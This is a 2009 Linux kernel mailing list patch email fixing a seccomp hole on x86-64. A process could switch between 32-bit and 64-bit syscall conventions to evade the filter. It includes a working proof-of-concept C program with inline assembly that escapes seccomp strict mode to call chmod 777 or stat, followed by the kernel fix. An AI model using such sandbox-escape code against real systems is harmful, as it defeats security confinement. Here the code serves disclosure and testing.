Return-Path: <linux-kernel-owner+w=401wt.eu-S1758238AbZB1DLR@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id S1758238AbZB1DLR (ORCPT <rfc822;w@1wt.eu>);
	Fri, 27 Feb 2009 22:11:17 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org id S1753101AbZB1DLD
	(ORCPT <rfc822;linux-kernel-outgoing>);
	Fri, 27 Feb 2009 22:11:03 -0500
Received: from mx1.redhat.com ([66.187.233.31]:52898 "EHLO mx1.redhat.com"
	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
	id S1752921AbZB1DLA (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
	Fri, 27 Feb 2009 22:11:00 -0500
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
From: Roland McGrath <roland@redhat.com>
To: Andrew Morton <akpm@linux-foundation.org>,
       Linus Torvalds <torvalds@linux-foundation.org>
Cc: x86@kernel.org, linux-kernel@vger.kernel.org, stable@kernel.org
X-Fcc: ~/Mail/linus
Subject: [PATCH 2/2] x86-64: seccomp: fix 32/64 syscall hole
In-Reply-To: Roland McGrath's message of  Friday, 27 February 2009 19:02:26 -0800 <20090228030226.C0D34FC3DA@magilla.sf.frob.com>
References: <20090228030226.C0D34FC3DA@magilla.sf.frob.com>
X-Windows: power tools for power losers.
Message-Id: <20090228030413.5B915FC3DA@magilla.sf.frob.com>
Date: Fri, 27 Feb 2009 19:04:13 -0800 (PST)
Sender: linux-kernel-owner@vger.kernel.org
List-ID: <linux-kernel.vger.kernel.org>
X-Mailing-List: linux-kernel@vger.kernel.org

On x86-64, a 32-bit process (TIF_IA32) can switch to 64-bit mode with
ljmp, and then use the "syscall" instruction to make a 64-bit system
call.  A 64-bit process make a 32-bit system call with int $0x80.

In both these cases under CONFIG_SECCOMP=y, secure_computing() will use
the wrong system call number table.  The fix is simple: test TS_COMPAT
instead of TIF_IA32.  Here is an example exploit:

	/* test case for seccomp circumvention on x86-64

	   There are two failure modes: compile with -m64 or compile with -m32.

	   The -m64 case is the worst one, because it does "chmod 777 ." (could
	   be any chmod call).  The -m32 case demonstrates it was able to do
	   stat(), which can glean information but not harm anything directly.

	   A buggy kernel will let the test do something, print, and exit 1; a
	   fixed kernel will make it exit with SIGKILL before it does anything.
	*/

	#define _GNU_SOURCE
	#include <assert.h>
	#include <inttypes.h>
	#include <stdio.h>
	#include <linux/prctl.h>
	#include <sys/stat.h>
	#include <unistd.h>
	#include <asm/unistd.h>

	int
	main (int argc, char **argv)
	{
	  char buf[100];
	  static const char dot[] = ".";
	  long ret;
	  unsigned st[24];

	  if (prctl (PR_SET_SECCOMP, 1, 0, 0, 0) != 0)
	    perror ("prctl(PR_SET_SECCOMP) -- not compiled into kernel?");

	#ifdef __x86_64__
	  assert ((uintptr_t) dot < (1UL << 32));
	  asm ("int $0x80 # %0 <- %1(%2 %3)"
	       : "=a" (ret) : "0" (15), "b" (dot), "c" (0777));
	  ret = snprintf (buf, sizeof buf,
			  "result %ld (check mode on .!)\n", ret);
	#elif defined __i386__
	  asm (".code32\n"
	       "pushl %%cs\n"
	       "pushl $2f\n"
	       "ljmpl $0x33, $1f\n"
	       ".code64\n"
	       "1: syscall # %0 <- %1(%2 %3)\n"
	       "lretl\n"
	       ".code32\n"
	       "2:"
	       : "=a" (ret) : "0" (4), "D" (dot), "S" (&st));
	  if (ret == 0)
	    ret = snprintf (buf, sizeof buf,
			    "stat . -> st_uid=%u\n", st[7]);
	  else
	    ret = snprintf (buf, sizeof buf, "result %ld\n", ret);
	#else
	# error "not this one"
	#endif

	  write (1, buf, ret);

	  syscall (__NR_exit, 1);
	  return 2;
	}

Signed-off-by: Roland McGrath <roland@redhat.com>
---
 arch/x86/include/asm/seccomp_64.h |   14 ++++++++------
 kernel/seccomp.c                  |   11 ++++++++---
 2 files changed, 16 insertions(+), 9 deletions(-)

diff --git a/arch/x86/include/asm/seccomp_64.h b/arch/x86/include/asm/seccomp_64.h
index 4171bb7..40e2564 100644
--- a/arch/x86/include/asm/seccomp_64.h
+++ b/arch/x86/include/asm/seccomp_64.h
@@ -3,15 +3,17 @@
 
 #include <linux/thread_info.h>
 
-#ifdef TIF_32BIT
-#error "unexpected TIF_32BIT on x86_64"
-#else
-#define TIF_32BIT TIF_IA32
-#endif
-
 #include <linux/unistd.h>
 #include <asm/ia32_unistd.h>
 
+/*
+ * This indicates we are inside a 32-bit system call (only testable
+ * synchronously by current), whereas TIF_IA32 indicates we are a 32-bit
+ * task.  A 32-bit task can make a 64-bit syscall by ljmp into 64-bit
+ * USER_CS, and a 64-bit task can make a 32-bit syscall by int $0x80.
+ */
+#define IS_COMPAT_TASK	is_compat_task()
+
 #define __NR_seccomp_read __NR_read
 #define __NR_seccomp_write __NR_write
 #define __NR_seccomp_exit __NR_exit
diff --git a/kernel/seccomp.c b/kernel/seccomp.c
index ad64fcb..8bf212f 100644
--- a/kernel/seccomp.c
+++ b/kernel/seccomp.c
@@ -8,6 +8,7 @@
 
 #include <linux/seccomp.h>
 #include <linux/sched.h>
+#include <linux/compat.h>
 
 /* #define SECCOMP_DEBUG 1 */
 #define NR_SECCOMP_MODES 1
@@ -22,7 +23,11 @@ static int mode1_syscalls[] = {
 	0, /* null terminated */
 };
 
-#ifdef TIF_32BIT
+#if defined TIF_32BIT && !defined IS_COMPAT_TASK
+# define IS_COMPAT_TASK	test_thread_flag(TIF_32BIT)
+#endif
+
+#ifdef IS_COMPAT_TASK
 static int mode1_syscalls_32[] = {
 	__NR_seccomp_read_32, __NR_seccomp_write_32, __NR_seccomp_exit_32, __NR_seccomp_sigreturn_32,
 	0, /* null terminated */
@@ -37,8 +42,8 @@ void __secure_computing(int this_syscall)
 	switch (mode) {
 	case 1:
 		syscall = mode1_syscalls;
-#ifdef TIF_32BIT
-		if (test_thread_flag(TIF_32BIT))
+#ifdef IS_COMPAT_TASK
+		if (IS_COMPAT_TASK)
 			syscall = mode1_syscalls_32;
 #endif
 		do {
